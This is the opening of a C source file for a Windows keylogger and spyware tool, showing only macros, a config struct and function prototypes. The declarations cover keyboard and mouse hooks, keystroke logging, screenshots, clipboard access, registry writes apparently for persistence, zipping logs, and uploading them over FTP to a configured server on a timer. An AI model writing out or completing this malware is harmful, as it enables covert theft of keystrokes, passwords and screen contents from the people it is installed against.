#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "GDI32.lib") 
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <conio.h>
#include <stdbool.h>
#include <time.h>
#include "third_party/zip.h"

#define USER "USER"
#define PASS "PASS"
#define CWD  "CWD"
#define PWD  "PWD"
#define TYPE_I "TYPE I"
#define PASV "PASV"
#define STOR "STOR"
#define ACCEPT_DATA "150" //Accepted data connection
#define INTERVAL_TIME 10
#define CMD_SIZE 256
#define STR_SIZE 512
#define STR_SIZE_MAX 1024
#define FILE_BUFF_SIZE 1420
#define N_FILES 50
#define LOG_FILE "logs"
#define CONF_FILE "config"
#define LF 0x0A
#define FTP_DIR "/"

struct ftp_config
{
    char host[CMD_SIZE];
    char port[CMD_SIZE];
    char login[CMD_SIZE];
    char password[CMD_SIZE];
    char dir[CMD_SIZE];
};

void init_vars(void);
bool send_file(void);
void create_zip_file(char *path_zip_file,
                     const char log_file[]);
void set_clipboard(void);
bool upload_file(const struct ftp_config* config,
    const char* file_name,
    const char* path_file);
void write_log(const char *data);
void change_window(void);
void recv_msg(SOCKET socket, char *get_buffer, unsigned int size);
void send_cmd(SOCKET socket, char *cmd);
int get_data_port(char *str);
bool set_registry_key( HKEY h_key,
                       const char key_path[],
                       const char key_name[],
                       char *key_data );
void get_registry_key( HKEY h_key,
                       char *key_path,
                       char *key_name,
                       char * reg_key );
bool screen_shot(char *szFilename, 
				 int Top, 
				 int Left, 
				 int Width, 
				 int Height);
bool save_bitmap(char *szFilename, HBITMAP hBitmap);
int _random(void);
void delete_socket(SOCKET s);
SOCKET create_socket(const char* _host, const char* port);
int CALLBACK keybard_hook(int n_code, DWORD w_param, DWORD l_param);
LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param);
void write_char_code(DWORD vk_code, bool shift, bool caps);
bool copy_file(char *src_file_path, char *dst_file_path);
bool read_config(const char config_file[], struct ftp_config *ftp);
void get_this_dir_path(char *this_dir_path);
